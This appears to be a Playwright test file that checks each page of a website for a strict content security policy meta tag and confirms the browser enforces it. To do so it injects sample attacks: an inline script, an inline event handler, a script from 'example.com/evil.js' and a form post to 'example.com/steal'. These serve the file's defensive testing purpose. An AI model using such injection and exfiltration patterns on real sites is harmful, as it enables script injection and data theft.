'use strict';
// Every page must carry a content security policy in a meta tag, and the browser must really enforce it.
// A meta tag cannot set every directive (for example frame-ancestors, which stops other sites framing the
// pages), so this is one layer, not the whole defence.
const { test, expect, sitePages } = require('./fixtures');

const pages = sitePages();

function parsePolicy(content) {
  const policy = {};
  content.split(';').map((s) => s.trim()).filter(Boolean).forEach((part) => {
    const [name, ...values] = part.split(/\s+/);
    policy[name.toLowerCase()] = values;
  });
  return policy;
}

test('the site has pages to test', () => {
  expect(pages.length).toBeGreaterThanOrEqual(7);
  expect(pages).toContain('index.html');
});

test.describe('every page has a content security policy', () => {
  for (const file of pages) {
    test(`${file} has the meta tag, with a strict policy, before any script or style`, async ({ page }) => {
      await page.goto(file);
      const meta = page.locator('meta[http-equiv="Content-Security-Policy" i]');
      await expect(meta).toHaveCount(1);
      const policy = parsePolicy(await meta.getAttribute('content'));

      expect(policy['default-src'], 'everything not named is blocked').toEqual(["'none'"]);
      expect(policy['script-src'], 'only scripts from the site, never inline').toEqual(["'self'"]);
      expect(policy['object-src']).toEqual(["'none'"]);
      expect(policy['base-uri']).toEqual(["'none'"]);
      expect(policy['form-action'], 'a form can never be sent anywhere').toEqual(["'none'"]);
      expect(policy['connect-src']).toEqual(["'self'"]);
      expect(policy['img-src']).toEqual(["'self'"]);
      expect(policy['style-src'], 'styles are inline, which is the one allowance').toEqual(["'self'", "'unsafe-inline'"]);
      const all = Object.values(policy).flat().join(' ');
      expect(all).not.toMatch(/unsafe-eval|\*|https?:|data:|blob:/);
      expect(Object.keys(policy).sort()).toEqual(['base-uri', 'connect-src', 'default-src', 'form-action', 'img-src', 'object-src', 'script-src', 'style-src']);

      // A policy only covers what comes after it in the page.
      const before = await page.evaluate(() => {
        const tag = document.querySelector('meta[http-equiv="Content-Security-Policy" i]');
        return [...document.querySelectorAll('script, style, link[rel="stylesheet"]')]
          .filter((n) => tag.compareDocumentPosition(n) & Node.DOCUMENT_POSITION_PRECEDING).length;
      });
      expect(before, 'scripts or styles that come before the policy').toBe(0);
    });

    test(`${file} loads and works under its policy, with no violation and no outside request`, async ({ page }) => {
      await page.goto(file);
      await page.waitForLoadState('networkidle');
      await expect(page.locator('h1')).toHaveCount(1);
      // The shared page fixture fails the test if the policy was broken or anything left the site.
    });
  }
});

test.describe('the policy is enforced by the browser', () => {
  test.use({ expectCspViolations: true });

  for (const file of pages) {
    test(`${file} blocks inline script, inline handlers, outside scripts and form posts`, async ({ page }) => {
      await page.goto(file);
      const result = await page.evaluate(() => new Promise((resolve) => {
        const seen = [];
        document.addEventListener('securitypolicyviolation', (e) => seen.push(e.violatedDirective));

        const inline = document.createElement('script'); // 1. an inline script
        inline.textContent = 'window.__inlineRan = true';
        document.head.appendChild(inline);

        const holder = document.createElement('div'); // 2. an inline event handler, the classic injection
        holder.innerHTML = '<img src="images/favicon.svg" onload="window.__handlerRan = true" onerror="window.__handlerRan = true">';
        document.body.appendChild(holder);

        const outside = document.createElement('script'); // 3. a script from another site
        outside.src = 'https://example.com/evil.js';
        document.head.appendChild(outside);

        const form = document.createElement('form'); // 4. a form sent to another site
        form.action = 'https://example.com/steal';
        form.method = 'post';
        document.body.appendChild(form);
        form.submit();

        setTimeout(() => resolve({
          seen,
          inlineRan: !!window.__inlineRan,
          handlerRan: !!window.__handlerRan,
          stillHere: location.href
        }), 600);
      }));

      expect(result.inlineRan, 'inline script must not run').toBe(false);
      expect(result.handlerRan, 'inline handler must not run').toBe(false);
      expect(result.stillHere, 'the form post must not leave the page').toContain(file);
      expect(result.seen.some((d) => d.startsWith('script-src-elem'))).toBe(true);
      expect(result.seen.some((d) => d === 'script-src-attr')).toBe(true);
      expect(result.seen).toContain('form-action');
    });
  }
});
